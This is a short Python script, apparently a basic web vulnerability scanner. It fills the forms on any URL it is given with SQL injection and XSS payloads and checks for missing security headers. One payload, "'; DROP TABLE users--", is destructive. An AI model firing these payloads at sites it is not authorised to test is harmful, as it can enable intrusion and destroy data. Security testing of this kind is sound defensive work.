import requests
from bs4 import BeautifulSoup
import urllib.parse

# SQL Injection payloads
SQLI_PAYLOADS = ["' OR '1'='1", "' UNION SELECT 1,2,3--", "' OR 1=1--", "'; DROP TABLE users--"]
XSS_PAYLOADS = ['<script>alert(1)</script>', '"><img src=x onerror=alert(1)>']


def extract_forms(url):
    """Extract all form elements from the web page."""
    response = requests.get(url)
    soup = BeautifulSoup(response.text, "html.parser")
    return soup.find_all("form")


def submit_form(form, url, payload):
    """Submits a form with the given payload to check for vulnerabilities."""
    action = form.get("action")
    post_url = urllib.parse.urljoin(url, action) if action else url
    method = form.get("method", "get").lower()

    inputs = form.find_all("input")
    data = {}

    for input_tag in inputs:
        name = input_tag.get("name")
        input_type = input_tag.get("type", "text")
        if name:
            data[name] = payload if input_type == "text" else input_tag.get("value", "")

    if method == "post":
        return requests.post(post_url, data=data)
    else:
        return requests.get(post_url, params=data)


def test_sql_injection(url):
    """Tests SQL Injection vulnerabilities."""
    print(f"[*] Testing for SQL Injection: {url}")
    forms = extract_forms(url)
    for form in forms:
        for payload in SQLI_PAYLOADS:
            response = submit_form(form, url, payload)
            if "error" in response.text.lower() or "syntax" in response.text.lower():
                print(f"[!] Possible SQL Injection detected on {url} with payload: {payload}")
                return True
    return False


def test_xss(url):
    """Tests for Cross-Site Scripting (XSS) vulnerabilities."""
    print(f"[*] Testing for XSS: {url}")
    forms = extract_forms(url)
    for form in forms:
        for payload in XSS_PAYLOADS:
            response = submit_form(form, url, payload)
            if payload in response.text:
                print(f"[!] Possible XSS detected on {url} with payload: {payload}")
                return True
    return False


def check_security_headers(url):
    """Checks for missing security headers."""
    print(f"[*] Checking security headers for {url}")
    response = requests.get(url)
    security_headers = [
        "X-Frame-Options",
        "Content-Security-Policy",
        "X-Content-Type-Options",
        "Strict-Transport-Security"
    ]
    missing_headers = [header for header in security_headers if header not in response.headers]

    if missing_headers:
        print(f"[!] Missing security headers: {', '.join(missing_headers)}")
    else:
        print("[‚úî] All essential security headers are present.")


def scan_website(url):
    """Main function to scan a website for vulnerabilities."""
    print(f"\nüîç Scanning website: {url}\n")
    if test_sql_injection(url):
        print("[üö®] SQL Injection vulnerability detected!")
    else:
        print("[‚úî] No SQL Injection vulnerabilities found.")

    if test_xss(url):
        print("[üö®] XSS vulnerability detected!")
    else:
        print("[‚úî] No XSS vulnerabilities found.")

    check_security_headers(url)


if __name__ == "__main__":
    target_url = input("Enter the target URL: ")
    scan_website(target_url)
